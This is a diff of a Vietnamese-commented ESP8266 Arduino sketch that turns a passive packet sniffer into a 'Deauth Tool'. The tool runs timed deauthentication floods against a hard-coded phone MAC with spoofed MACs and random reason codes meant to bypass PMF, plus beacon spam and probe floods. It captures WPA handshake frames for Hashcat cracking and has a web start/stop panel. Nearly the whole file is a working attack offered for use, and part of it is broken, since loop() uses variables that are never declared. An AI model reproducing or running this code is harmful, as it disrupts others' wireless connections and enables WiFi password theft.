@@ -1,92 +1,211 @@
 #include <ESP8266WiFi.h>
+#include <ESP8266WebServer.h>  // Thêm thư viện cho web server
+#include <ESP8266TimerInterrupt.h>  // Install "ESP8266TimerInterrupt" qua Library Manager
 
 extern "C" {
   #include "user_interface.h"
 }
 
-// Buffer lưu gói tin (volatile để callback an toàn)
-volatile uint8_t packetBuffer[512];
-volatile uint16_t packetLen = 0;
-volatile bool newPacket = false;
+// CONFIG CỰC MẠNH
+#define CHANNEL 5               // Cố định channel 5
+#define DEAUTH_RATE 500         // Số gói/giây (max 500, cao quá treo)
+#define BEACON_SPAM_COUNT 50    // Số SSID fake khi spam
+#define PROBE_FLOOD_COUNT 100   // Số probe flood/giây
+#define RANDOM_REASON true      // Random reason code để bypass PMF
 
-void sniffer_callback(uint8_t *buf, uint16_t len) {
-  if (len < 50 || len > sizeof(packetBuffer) || newPacket) return;
+// MAC target (đã thêm MAC OPPO A7 của bạn)
+uint8_t targetMac[6] = {0xA4, 0x12, 0x32, 0x8B, 0x54, 0x0F};  // MAC OPPO A7 - Bro thay bằng MAC khác nếu cần
+
+// Buffer lưu 4 gói EAPOL (đủ handshake)
+uint8_t eapolBuffers[4][512];
+uint16_t eapolLens[4] = {0};
+int eapolCount = 0;
+
+bool attackRunning = false;
+
+// Gói deauth mẫu
+uint8_t deauthPacket[26] = {
+  0xC0, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
+  0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
+  0x00, 0x00, 0x07, 0x00
+};
+
+// Web server tại port 80, IP 192.168.4.1
+ESP8266WebServer server(80);
+
+// Callback sniffer
+void sniffer_cb(uint8_t *buf, uint16_t len) {
+  if (len < 50 || eapolCount >= 4) return;
 
   uint8_t fc = buf[0];
-  if ((fc & 0xFC) != 0x88) return;  // Không phải QoS Data
+  if ((fc & 0xFC) != 0x88 || (buf[1] & 0x40) == 0) return;
 
-  if ((buf[1] & 0x40) == 0) return;  // Không protected
+  uint8_t *payload = buf + 24 + ((fc >> 4) & 0x08 ? 2 : 0);
 
-  uint8_t *payload = buf + 24;
-  if ((fc >> 4) & 0x08) payload += 2;
-
-  if (payload[0] == 0xAA && payload[1] == 0xAA && payload[2] == 0x03 &&
-      payload[3] == 0x00 && payload[4] == 0x00 && payload[5] == 0x00 &&
-      payload[6] == 0x88 && payload[7] == 0x8E) {
-
-    Serial.print("EAPOL DETECTED! Len: ");
-    Serial.print(len);
-    Serial.print(" | From MAC: ");
-    for (int i = 0; i < 6; i++) {
-      Serial.printf("%02X", buf[10 + i]);
-      if (i < 5) Serial.print(":");
-    }
-    Serial.println();
-
-    // Copy buffer (volatile nên dùng memcpy)
-    memcpy((void*)packetBuffer, buf, len);
-    packetLen = len;
-    newPacket = true;
+  if (payload[6] == 0x88 && payload[7] == 0x8E) {
+    memcpy(eapolBuffers[eapolCount], buf, len);
+    eapolLens[eapolCount] = len;
+    eapolCount++;
+    Serial.print("\n[SNIF] EAPOL #");
+    Serial.print(eapolCount);
+    Serial.print(" DETECTED! Len: ");
+    Serial.println(len);
   }
+}
+
+// Timer flood deauth
+ESP8266Timer *ITimer;
+
+void floodDeauth() {
+  if (!attackRunning) return;
+
+  // Random reason code
+  if (RANDOM_REASON) deauthPacket[24] = random(1, 11);
+
+  // Spoof MAC random
+  for (int i = 0; i < 6; i++) {
+    deauthPacket[10 + i] = random(0xFF);  // Source
+    deauthPacket[16 + i] = random(0xFF);  // BSSID
+  }
+
+  // Receiver = target MAC
+  memcpy(deauthPacket + 4, targetMac, 6);
+
+  wifi_send_pkt_freedom(deauthPacket, 26, 0);
+  Serial.print(".");
+}
+
+// Trang web chính
+void handleRoot() {
+  String html = "<html><body><h1>Deauth Tool</h1>";
+  html += "<p>Status: " + String(attackRunning ? "Running" : "Stopped") + "</p>";
+  html += "<form action='/on'><input type='submit' value='Start Attack'></form>";
+  html += "<form action='/off'><input type='submit' value='Stop Attack'></form>";
+  html += "<h2>Captured EAPOL (" + String(eapolCount) + ")</h2>";
+  for (int i = 0; i < eapolCount; i++) {
+    html += "<p>EAPOL #" + String(i+1) + " Len: " + String(eapolLens[i]) + "</p>";
+    html += "<textarea rows='5' cols='50'>";
+    for (int j = 0; j < eapolLens[i]; j++) {
+      char hex[3];
+      sprintf(hex, "%02X ", eapolBuffers[i][j]);
+      html += hex;
+    }
+    html += "</textarea><br>";
+  }
+  html += "</body></html>";
+  server.send(200, "text/html", html);
+}
+
+// Start attack qua web
+void handleOn() {
+  attackRunning = true;
+  server.sendHeader("Location", "/");
+  server.send(302);
+}
+
+// Stop attack qua web
+void handleOff() {
+  attackRunning = false;
+  server.sendHeader("Location", "/");
+  server.send(302);
 }
 
 void setup() {
   Serial.begin(115200);
   delay(1000);
-  Serial.println("\n[OK] ESP8266 Sniffer - Channel 5 - Bat EAPOL (da fix treo)");
+  Serial.println("\n[START] ESP8266 Deauth + Scan + Sniffer CUC MANH - Channel 5 with Web");
 
-  system_phy_set_max_tpw(40);  // Giữ nguyên hạ công suất
+  WiFi.mode(WIFI_AP_STA);
+  WiFi.softAP("DeauthTool", "password123");  // Tạo AP: SSID "DeauthTool", pass "password123"
+  Serial.print("IP Web: ");
+  Serial.println(WiFi.softAPIP());  // 192.168.4.1
 
-  WiFi.mode(WIFI_STA);
+  server.on("/", handleRoot);
+  server.on("/on", handleOn);
+  server.on("/off", handleOff);
+  server.begin();
+
   WiFi.disconnect();
+  delay(100);
 
-  wifi_promiscuous_enable(0);
-  wifi_set_promiscuous_rx_cb(sniffer_callback);
-  wifi_set_channel(5);
   wifi_promiscuous_enable(1);
+  wifi_set_promiscuous_rx_cb(sniffer_cb);
+  wifi_set_channel(CHANNEL);
 
-  Serial.println("Da bat dau nghe tren channel 5...");
+  // Timer flood
+  ITimer = new ESP8266Timer();
+  ITimer->attachInterruptInterval(1000 * 1000 / DEAUTH_RATE, floodDeauth);
+
+  Serial.println("Da san sang - Truy cap 192.168.4.1 tu dien thoai!");
 }
 
 void loop() {
-  if (newPacket) {
-    // Xử lý gói tin ở đây (không volatile nữa)
-    uint8_t *buf = (uint8_t*)packetBuffer;  // Cast an toàn
+  server.handleClient();  // Xử lý request web
 
-    // Tính offset eapol (sau header 802.11 + SNAP)
-    uint8_t *eapol = buf + 24;
-    if ((buf[0] >> 4) & 0x08) eapol += 2;  // QoS Control
-    eapol += 8;  // Sau SNAP
-
-    if (eapol[0] == 0x02 && eapol[1] == 0x03 && eapol[13] == 0x00) {
-      Serial.println("PMKID detected! (Message 1)");
-      Serial.print("PMKID: ");
-      for (int i = 0; i < 16; i++) {
-        Serial.printf("%02X", eapol[77 + i]);
-      }
-      Serial.println();
+  // Scan mỗi 10s
+  static uint32_t lastScan = 0;
+  if (millis() - lastScan > 10000) {
+    Serial.println("\n[SCAN] Ket qua:");
+    int n = WiFi.scanNetworks();
+    for (int i = 0; i < n; i++) {
+      Serial.printf("%d | %s | MAC: %s | Ch: %d | RSSI: %d\n",
+                    i+1, WiFi.SSID(i).c_str(), WiFi.BSSIDstr(i).c_str(), WiFi.channel(i), WiFi.RSSI(i));
     }
+    WiFi.scanDelete();
+    lastScan = millis();
+  }
 
-    // In hex ngắn gọn (chỉ 64 byte đầu)
-    Serial.print("Hex (first 64): ");
-    for (int i = 0; i < 64 && i < packetLen; i++) {
-      Serial.printf("%02X ", buf[i]);
+  // Beacon spam nếu attack
+  if (attackRunning) {
+    for (int i = 0; i < BEACON_SPAM_COUNT; i++) {
+      uint8_t beacon[128];
+      memset(beacon, 0, 128);
+      beacon[0] = 0x80;
+      memcpy(beacon + 4, targetMac, 6);
+      memcpy(beacon + 10, targetMac, 6);
+      sprintf((char*)beacon + 26, "FakeSSID_%d", i);
+      wifi_send_pkt_freedom(beacon, 36, 0);
     }
-    Serial.println("\n");
+  }
 
-    newPacket = false;
+  // Probe flood nếu attack
+  if (attackRunning) {
+    for (int i = 0; i < PROBE_FLOOD_COUNT; i++) {
+      uint8_t probe[64];
+      memset(probe, 0, 64);
+      probe[0] = 0x40;
+      memcpy(probe + 4, targetMac, 6);
+      sprintf((char*)probe + 26, "Probe_%d", i);
+      wifi_send_pkt_freedom(probe, 36, 0);
+    }
+  }
+
+  // Xử lý EAPOL nếu bắt được
+  if (capturedEapol) {
+    Serial.println("\n[SNIF] Da bat duoc EAPOL! Hex dump:");
+    for (int i = 0; i < eapolLen; i++) {
+      Serial.printf("%02X ", eapolBuffer[i]);
+      if ((i+1) % 16 == 0) Serial.println();
+    }
+    Serial.println("\nCopy hex de crack Hashcat!");
+    capturedEapol = false;
   }
 
   yield();
   delay(1);
+}
+
+// Serial control vẫn có
+void serialEvent() {
+  while (Serial.available()) {
+    String cmd = Serial.readStringUntil('\n');
+    cmd.trim();
+    if (cmd == "on") {
+      attackRunning = true;
+      Serial.println("[ATTACK] Da bat!");
+    } else if (cmd == "off") {
+      attackRunning = false;
+      Serial.println("[ATTACK] Da dung!");
+    }
+  }
 }
